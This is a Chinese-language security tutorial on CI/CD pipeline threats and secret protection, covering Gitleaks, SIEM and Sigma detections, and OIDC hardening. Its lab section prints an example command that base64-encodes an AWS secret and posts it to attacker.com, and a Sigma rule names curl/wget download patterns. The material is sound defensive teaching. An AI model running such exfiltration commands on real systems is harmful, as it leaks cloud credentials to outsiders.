# 04.3 CI/CD 自動化管道審計與密鑰外洩防範 (CI/CD Pipeline Security & Secret Protection)

## 案發現場破題

在持續整合與持續部署（CI/CD）自動化浪潮下，軟體交付流水線（如 GitHub Actions, GitLab CI/CD, Jenkins）已成為企業內部最敏感的「特權樞紐」。Runner 構建機通常擁有直接存取生產雲端環境（AWS/GCP/Azure）、容器註冊表（Docker Hub/ECR）與內部資料庫的超級權限。攻擊者若能透過惡意 Pull Request、被污染的第三方 Action、或代碼注入劫持 CI/CD 流程，即可上演「SolarWinds 級別的軟體供應鏈劫持」或直接偷渡外洩長效 API 憑證。

```
[外部未授權攻擊者]
       │
       ├── 發起惡意 Fork Pull Request (包含竄改之 .github/workflows/*.yml)
       ▼
[GitHub Actions Runner (配置 pull_request_target 弱點)]
       │
       ├── 1. 繞過審查直接觸發 Runner 執行
       ├── 2. 存取倉庫注入的長效 AWS_SECRET_ACCESS_KEY
       ├── 3. 透過 Gitleaks 掃描出過去 Git 歷史提交中遺留的 Database Password
       ▼
[攻擊者外部 C2 伺服器]
       │
       └── 取得企業生產環境最高特權，發動雲端勒索或持久化後門植入
```

### 痛點場景
- **密鑰散落與歷史提交殘留**：工程師常不慎將 API Key、私鑰或密碼 Commit 進 Git，即便後續以 `git rm` 刪除，該敏感字串依然永久保留於 `.git/objects` 歷史記錄中。
- **第三方 Actions 供應鏈弱點**：在 Workflow 中直接引用未鎖定 Commit SHA 的第三方 Action（如 `uses: actions/checkout@v2`），若該開源 Action 作者帳號遭劫持或被投毒，構建流程將自動下載惡意代碼。
- **長效憑證濫用**：許多企業在 CI/CD 環境變數中儲存長期有效的 AWS IAM Secret 或服務主體金鑰，缺乏輪替機制且無法綁定發起者身分。

## 第一動：CI/CD 威脅架構與 OWASP Top 10 for CI/CD (Attack Vectors & Mechanics)

```
+-----------------------------------------------------------------------------------------------+
| CI/CD 流水線核心威脅與防禦標準 (OWASP Top 10 for CI/CD Security)                              |
|                                                                                               |
| 1. 流水線毒化執行 (Pipeline Execution Poisoning - PEP)                                        |
|    - 威脅：攻擊者透過 PR 修改 .gitlab-ci.yml 或 Makefile，注入 curl | bash 惡意載荷。         |
|    - 防禦：限制 PR 觸發構建權限，強制實施 Pull Request 程式碼審查與身分核可。                  |
|                                                                                               |
| 2. 不安全的第三方依賴與 Actions (Insecure Third-Party Actions)                                 |
|    - 威脅：引用的 GitHub Action Tag (如 @v1) 可被攻擊者覆寫指向惡意 Commit。                 |
|    - 防禦：強制採用 Full Commit SHA 鎖定 (例: uses: actions/checkout@b4ffde65...)。           |
|                                                                                               |
| 3. 憑證清洗不完全與日誌外洩 (Secret Leakage in Build Logs)                                   |
|    - 威脅：腳本執行 `set -x` 或列印變數時，將 API Token 明文暴露於公開構建日誌。               |
|    - 防禦：啟用自動化 Secret Masking，全面以 OIDC 代替靜態 Long-lived Token。                  |
+-----------------------------------------------------------------------------------------------+
```

### 關鍵防禦機制對比

| 防禦維度 | 脆弱配置 (Vulnerable Configuration) | 零信任加固基準 (Zero Trust Baseline) |
| :--- | :--- | :--- |
| **Action 版本綁定** | `uses: actions/setup-node@v3` (浮動標籤) | `uses: actions/setup-node@1a...` (完整 40 位 SHA-1 哈希) |
| **PR 觸發事件** | 使用 `pull_request_target` 且直接 checkout PR 分支代碼 | 嚴格使用 `pull_request`，且外部貢獻者需經管理員核准 Runner 執行 |
| **雲端身分認證** | 於 Repository Secrets 儲存 `AWS_SECRET_ACCESS_KEY` | 使用 **GitHub Actions OIDC + AWS IAM Role** 簽發短期動態 Token |

## 第二動：工具鏈實戰：Gitleaks 深度歷史密鑰排查 (Gitleaks Toolchain)

### 1. 使用 Gitleaks 掃描本機 Git 全歷史提交
```bash
# 針對整個代碼庫的所有分支與歷史 commit 進行正則與熵值比對
gitleaks detect --source=. --verbose --report-path=gitleaks-report.json

# 檢視報告中發現的外洩密鑰類型與提交哈希
cat gitleaks-report.json | jq '.[] | {RuleID: .RuleID, Commit: .Commit, File: .File, Finding: .Secret}'
```

### 2. 配置 Pre-commit 本機阻斷鉤子 (`.pre-commit-config.yaml`)
防止工程師在 `git commit` 當下將密鑰推送至遠端：
```yaml
repos:
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.2
    hooks:
      - id: gitleaks
```

## 第三動：CI/CD 遙測日誌收集與審計設定 (Telemetry Setup: GitHub Audit Log)

### 1. GitHub Enterprise / Organization 審計日誌轉發
透過 GitHub Webhook 或 Streaming API 將日誌送往 SIEM：
- **`org.secret_scanning_alert_create`**：偵測到公開或私有倉庫中存在外洩密鑰。
- **`workflows.workflow_run`**：工作流程執行狀態與觸發者。
- **`environment_secret.create / update`**：流水線敏感環境變數被異動。

### 2. Linux Self-hosted Runner 端點行程監控
在私有 Runner 上部署 Auditd 或 Sysmon for Linux，監控 Runner 程序的異常外聯：
```text
-w /home/runner/actions-runner/ -p wa -k runner_tamper
```

## 第四動：SIEM 關聯規則與即時獵捕分析 (Splunk & Sigma Rules)

### 1. Splunk SPL：偵測 GitHub Actions 執行非官方或異常名稱的自訂指令碼
```spl
index=github_audit sourcetype="github:workflow"
| spath path=workflow_run.head_commit.author.email output=author
| spath path=workflow_run.head_branch output=branch
| spath path=workflow_run.event output=event_type
| search event_type="pull_request_target"
| table _time, repository.full_name, author, branch, workflow_run.name, workflow_run.html_url
```

### 2. Splunk SPL：偵測公開外洩之雲端金鑰於 10 分鐘內遭惡意呼叫 (Key Leaks Alert)
```spl
index=aws_cloudtrail eventName=*
| join type=inner accessKeyId [
    search index=devsecops sourcetype="gitleaks:json"
    | eval accessKeyId=Secret
    | fields accessKeyId
  ]
| stats count earliest(_time) as first_use latest(_time) as last_use by accessKeyId, eventName, srcIP, userAgent
| table first_use, last_use, accessKeyId, eventName, srcIP, userAgent
```

### 3. Sigma 偵測規則：Suspicious Download in CI/CD Runner
```yaml
title: Suspicious Tool Download inside CI Runner
id: 8d1045ca-9a01-4478-9eef-4178521a0071
status: production
description: 偵測 CI/CD 工作流程執行期間嘗試從外部未授權 IP 下載可執行檔
logsource:
    category: process_creation
    product: linux
detection:
    selection:
        Image|endswith:
            - '/curl'
            - '/wget'
        CommandLine|contains:
            - 'pastebin'
            - 'raw.githubusercontent.com'
            - 'ngrok'
            - 'c2'
    condition: selection
level: high
```

## 第五動：零信任身分同盟與安全流水線架構 (OIDC & Pipeline Hardening)

```
[GitHub Actions Runner] ──► 1. 索取 OIDC JWT (含 repo, branch, commit claims)
           │
           ▼
[雲端身分提供者 (AWS IAM / GCP Workload Identity)]
           │
           ├── 2. 驗證 JWT 簽章與 Claims (僅允許 repo: "corp/prod-app" 且 ref: "refs/heads/main")
           ▼
[簽發 15 分鐘短期臨時憑證 (STS AssumeRoleWithWebIdentity)] ──► Runner 執行發布
```

### 1. 全面淘汰靜態密鑰：採用 GitHub Actions OIDC + AWS IAM 整合
在 Workflow 中不再設定 `AWS_ACCESS_KEY_ID`，改用動態短期憑證：
```yaml
permissions:
  id-token: write # 允許索取 OIDC JWT
  contents: read

jobs:
  deploy-production:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/GitHubActionsProductionRole
          aws-region: us-east-1

      - name: Deploy Artifact to S3
        run: aws s3 sync ./dist s3://corp-production-bucket/
```

### 2. 徹底消除 Git 歷史外洩密鑰 (使用 git-filter-repo)
一旦發現密鑰被 Push 進倉庫，單純再次提交是無效的，必須徹底覆寫歷史並即刻廢止金鑰：
```bash
# 安裝並執行 git-filter-repo 徹底自所有 Commit 抹除敏感檔案
git filter-repo --invert-paths --path config/production.key --force

# 強制推送到遠端所有分支 (需全體團隊重新 Clone)
git push origin --force --all
```

## 靶場實戰：惡意 PR 密鑰偷渡與 OIDC 防禦演練

### 靶場環境情境
- **企業倉庫**: `corp/billing-system` (包含自動部署至 AWS 的 CI/CD 流水線)
- **攻擊者行為**: 外部攻擊者 Fork 專案後提交 PR，在 Workflow 中注入代碼嘗試將 `secrets.AWS_SECRET_ACCESS_KEY` 打包外傳。

### 實戰步驟一：審查漏洞所在
1. 發現該專案原配置使用了 `on: pull_request_target` 且直接檢出 PR 來源分支，給予 Fork 貢獻者讀取 Repo Secrets 的特權。
2. 攻擊者在 PR 中新增指令：`echo $AWS_SECRET_ACCESS_KEY | base64 | curl -d @- https://attacker.com/loot`。

### 實戰步驟二：事件應變與金鑰輪換
1. **立即吊銷外洩之 AWS IAM User**，中斷其所有 Active Access Keys。
2. 刪除該惡意 PR 並封鎖該 GitHub 使用者。

### 實戰步驟三：架構重構與加固
1. 將 `pull_request_target` 替換為 `pull_request`。
2. 全面廢止靜態 IAM User，改用 AWS IAM Role + OIDC 信任策略，僅允許 `repo:corp/billing-system:ref:refs/heads/main` 索取臨時 Token。

- [ ] **歷史抹除處置**：熟練掌握 `git-filter-repo` 徹底自 Commit History 抹除敏感檔案的正確流程。
- [ ] **日誌稽核關聯**：能撰寫 SIEM 查詢比對外洩密鑰的異常呼叫行為，在 5 分鐘內完成封鎖與輪換。
